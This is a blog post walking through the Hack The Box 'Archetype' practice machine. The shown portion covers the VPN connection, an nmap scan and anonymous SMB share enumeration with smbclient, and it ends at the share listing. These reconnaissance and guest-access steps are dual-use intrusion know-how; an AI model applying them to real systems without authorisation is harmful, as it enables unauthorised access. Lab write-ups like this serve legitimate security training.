<!doctype html>
<html lang="en" dir="ltr" class="blog-wrapper blog-post-page plugin-blog plugin-id-default" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.5.2">
<title data-rh="true">Hack The Box ‘Archetype’ Challenge | Kobbi&#x27;s Knowledgebase</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://kbbgl.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://kbbgl.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://kbbgl.github.io/blog/hack-the-box-archetype-challenge"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docusaurus_tag" content="default"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docsearch:docusaurus_tag" content="default"><meta data-rh="true" property="og:title" content="Hack The Box ‘Archetype’ Challenge | Kobbi&#x27;s Knowledgebase"><meta data-rh="true" name="description" content="Fill me up!"><meta data-rh="true" property="og:description" content="Fill me up!"><meta data-rh="true" property="og:type" content="article"><meta data-rh="true" property="article:published_time" content="2025-02-07T09:41:12.000Z"><meta data-rh="true" property="article:author" content="https://github.com/kbbgl"><meta data-rh="true" property="article:tag" content="Capture_the_flag,Ctf,Cybersecurity,Hacking,Smb,Windows"><link data-rh="true" rel="icon" href="/img/favicon.svg"><link data-rh="true" rel="canonical" href="https://kbbgl.github.io/blog/hack-the-box-archetype-challenge"><link data-rh="true" rel="alternate" href="https://kbbgl.github.io/blog/hack-the-box-archetype-challenge" hreflang="en"><link data-rh="true" rel="alternate" href="https://kbbgl.github.io/blog/hack-the-box-archetype-challenge" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://3OEAR0LK7K-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","@id":"https://kbbgl.github.io/blog/hack-the-box-archetype-challenge","mainEntityOfPage":"https://kbbgl.github.io/blog/hack-the-box-archetype-challenge","url":"https://kbbgl.github.io/blog/hack-the-box-archetype-challenge","headline":"Hack The Box ‘Archetype’ Challenge","name":"Hack The Box ‘Archetype’ Challenge","description":"Fill me up!","datePublished":"2025-02-07T09:41:12.000Z","author":{"@type":"Person","name":"Kobbi Gal","description":"I like to pick things apart and see how they work inside","url":"https://github.com/kbbgl","image":"https://avatars.githubusercontent.com/u/14372649"},"keywords":[],"isPartOf":{"@type":"Blog","@id":"https://kbbgl.github.io/blog","name":"Blog"}}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="Kobbi&#39;s Knowledgebase RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="Kobbi&#39;s Knowledgebase Atom Feed">



<link rel="search" type="application/opensearchdescription+xml" title="Kobbi&#39;s Knowledgebase" href="/opensearch.xml"><link rel="stylesheet" href="/assets/css/styles.e64d8b45.css">
<script src="/assets/js/runtime~main.b10f4887.js" defer="defer"></script>
<script src="/assets/js/main.4400218c.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">Kobbi&#x27;s Knowledgebase</b></a><a class="navbar__item navbar__link" href="/docs">Docs</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" sidebarid="blogSidebar" href="/blog">Blog</a><a class="navbar__item navbar__link" sidebarid="hackBlogSidebar" href="/hack_blog">Hack Blog</a></div><div class="navbar__items navbar__items--right"><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="Search"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">Search</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_re4s thin-scrollbar" aria-label="Blog recent posts navigation"><div class="sidebarItemTitle_pO2u margin-bottom--md">Recent posts</div><div role="group"><h3 class="yearGroupHeading_rMGB">2025</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/3-way-data-migration-between-support-systems">3-Way Data Migration between Support Systems</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/angstrom-ctf2021-exploiting-python-pickle-in-flask">Angstrom CTF2021 | Exploiting Python Pickle in Flask Web App</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/catch-ebusy-on-nodejs">How To Catch EBUSY Event on Windows using NodeJS</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/debugging-nodejs-microservice-with-shared-storage-on-kubernetes">Debugging NodeJS Microservice with Shared Storage on Kubernetes</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/dotless-email-regex-validation-swagger">How To Set Up Dotless Email Validation in Swagger</a></li></ul></div></nav></aside><main class="col col--7"><article><header><h1 class="title_f1Hy">Hack The Box ‘Archetype’ Challenge</h1><div class="container_mt6G margin-vert--md"><time datetime="2025-02-07T09:41:12.000Z">February 7, 2025</time> · <!-- -->15 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--12 authorCol_Hf19"><div class="avatar margin-bottom--sm"><a href="https://github.com/kbbgl" target="_blank" rel="noopener noreferrer" class="avatar__photo-link"><img class="avatar__photo authorImage_XqGP" src="https://avatars.githubusercontent.com/u/14372649" alt="Kobbi Gal"></a><div class="avatar__intro authorDetails_lV9A"><div class="avatar__name"><a href="https://github.com/kbbgl" target="_blank" rel="noopener noreferrer"><span class="authorName_yefp">Kobbi Gal</span></a></div><small class="authorTitle_nd0D" title="I like to pick things apart and see how they work inside">I like to pick things apart and see how they work inside</small><div class="authorSocials_rSDt"></div></div></div></div></div></header><div id="__blog-post-container" class="markdown"><h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-hack-the-box">What is Hack The Box?<a href="#what-is-hack-the-box" class="hash-link" aria-label="Direct link to What is Hack The Box?" title="Direct link to What is Hack The Box?">​</a></h2>
<p><a href="https://www.hackthebox.eu/" target="_blank" rel="noopener noreferrer">Hack The Box</a> is a website offering vulnerable machines for practising hacking skills. The goal of the ‘Labs’ are to hack into the system and capture the flag (CTF) which can be found in a text file in the desktop of a regular and an administrator user.
On my pursuit to get some practical exercise in the field, I decided to sign up and attempt one of the beginner exercises. This post describes how I managed to get remote code execution (RCE) in the one of the boxes and access the flags.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="connecting-to-hack-the-box-network">Connecting to Hack The Box Network<a href="#connecting-to-hack-the-box-network" class="hash-link" aria-label="Direct link to Connecting to Hack The Box Network" title="Direct link to Connecting to Hack The Box Network">​</a></h2>
<p>The first step is to connect to the Hack The Box network to be able to enumerate the target machine. To do this, we need to download an OpenVPN configuration file (<code>.ovpn</code>) and use the <code>openvpn</code> utility to create the tunnel into the Hack The Box network:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> openvpn /path/to/hack_the_box.ovpn</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Attempting to establish TCP connection with </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">AF_INET</span><span class="token punctuation" style="color:#393A34">]</span><span class="token number" style="color:#36acaa">1.222</span><span class="token plain">.333.222:443 </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">nonblock</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">TCP connection established with </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">AF_INET</span><span class="token punctuation" style="color:#393A34">]</span><span class="token number" style="color:#36acaa">1.222</span><span class="token plain">.333.222:443</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="enumeration">Enumeration<a href="#enumeration" class="hash-link" aria-label="Direct link to Enumeration" title="Direct link to Enumeration">​</a></h2>
<p>To enumerate a target machine (IP <code>10.12.12.27</code>) is to list all possible ways we can use to hack into it. The best place to start is to scan the machine for open ports and try to detect the operating system so we can tailor our methods. To perform the scan, I used the standard way, <a href="https://nmap.org/" target="_blank" rel="noopener noreferrer"><code>nmap</code>, the network mapper</a>.
I executed the scan as follows as I found it gives a pretty verbose output and the scan is quite fast as well:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token assign-left variable" style="color:#36acaa">ip</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;10.12.12.27&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap </span><span class="token parameter variable" style="color:#36acaa">-T4</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-A</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-oN</span><span class="token plain"> nmap_scan.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The <code>-A</code> flag is to used to detect the operating system and version and <code>traceroute</code>.
The <code>-T4</code> flag is there to ensure that the scan is fast. The range is between <code>0-5</code> where the higher the number, the faster it scans.
The <code>-oN</code> flag tells the tool to save the scan to a file, in this case <code>nmap_scan.txt</code> in the same directory.
Reviewing the scan output, we see that that the machine is a 2019 Windows Server  and has a SQL Server 2017 instance listening on port 1433:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> nmap_scan.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PORT     STATE SERVICE      VERSION                                                                                                    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">135</span><span class="token plain">/tcp  </span><span class="token function" style="color:#d73a49">open</span><span class="token plain">  msrpc        Microsoft Windows RPC                                                                                      </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">139</span><span class="token plain">/tcp  </span><span class="token function" style="color:#d73a49">open</span><span class="token plain">  netbios-ssn  Microsoft Windows netbios-ssn                                                                              </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">445</span><span class="token plain">/tcp  </span><span class="token function" style="color:#d73a49">open</span><span class="token plain">  microsoft-ds Windows Server </span><span class="token number" style="color:#36acaa">2019</span><span class="token plain"> Standard </span><span class="token number" style="color:#36acaa">17763</span><span class="token plain"> microsoft-ds                                                            </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1433</span><span class="token plain">/tcp </span><span class="token function" style="color:#d73a49">open</span><span class="token plain">  ms-sql-s     Microsoft SQL Server </span><span class="token number" style="color:#36acaa">2017</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">14.00</span><span class="token plain">.1000.00</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> RTM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">. </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>If we scroll down a bit more, we can see that the target machine discovery was done using the <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831795(v=ws.11)" target="_blank" rel="noopener noreferrer">SMB (Server Message Block)</a> running on port 445 which is a protocol for shared files and folders in a network:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> nmap_scan.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Host script results:                                               </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.                       </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> smb-security-mode:                                               </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   account_used: guest                                            </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   authentication_level: user                                     </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   challenge_response: supported                                  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain">_  message_signing: disabled </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dangerous, but default</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This is the protocol that allows us to access remote shared network drives from Windows Explorer by inserting <code>\\REMOTE_IP\SHARE_NAME</code> in the address bar. SMB is known to have many vulnerabilities (e.g. <a href="https://en.wikipedia.org/wiki/EternalBlue" target="_blank" rel="noopener noreferrer">EternalBlue</a>, <a href="https://msrc.microsoft.com/update-guide/vulnerability/ADV200005" target="_blank" rel="noopener noreferrer">ADV200005</a>) so my intuition guided me to use this protocol to gain more information about the system. Also, we can see pretty clearly that the guest user is enabled which inherently means that there’s no need for a password!</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="getting-credentials-using-smbclient">Getting Credentials using <code>smbclient</code><a href="#getting-credentials-using-smbclient" class="hash-link" aria-label="Direct link to getting-credentials-using-smbclient" title="Direct link to getting-credentials-using-smbclient">​</a></h2>
<p>Now that we know that the SMB server is up, we need to find a way to connect and enumerate it. I found this <a href="https://unix.stackexchange.com/questions/65106/accessing-a-smb-share-without-a-password" target="_blank" rel="noopener noreferrer">UNIX StackExchange post</a> helpful as it mentioned that we can connect to the SMB server using a client called smbclient and it provided the arguments needed to connect without a password.
I found that I already had <code>smbclient</code> installed:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">which</span><span class="token plain"> smbclient</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/smbclient</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I attempted to connect to the SMB server using the following command:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">smbclient //</span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain">// </span><span class="token parameter variable" style="color:#36acaa">-U</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot; &quot;</span><span class="token plain">%</span><span class="token string" style="color:#e3116c">&quot; &quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>But I saw no output. It could be a positive since it means that I reached the server and no connection errors were thrown. But it seems that I was missing something to get it to display its contents.
I turned to reading the smbclient manual and found that there’s a way to list the server contents:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">man</span><span class="token plain"> smbclient</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-L</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">--list                                                                                                                       </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           This option allows you to </span><span class="token function" style="color:#d73a49">look</span><span class="token plain"> at what services are available on a server. You use it as smbclient </span><span class="token parameter variable" style="color:#36acaa">-L</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">host</span><span class="token plain"> and a list should appear.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Sounds promising. When I ran it, I got the following output:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">smbclient </span><span class="token parameter variable" style="color:#36acaa">-L</span><span class="token plain"> //</span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain">// </span><span class="token parameter variable" style="color:#36acaa">-U</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot; &quot;</span><span class="token plain">%</span><span class="token string" style="color:#e3116c">&quot; &quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                                                                                                                       </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Sharename       Type      Comment                                                                                              </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ---------       ----      -------                                                                                              </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ADMIN$          Disk      Remote Admin                                                                                         </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        backups         Disk                                                                                                           </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        C$              Disk      Default share                                                                                        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        IPC$            IPC       Remote IPC                                                                                           </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SMB1 disabled -- no workgroup available</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
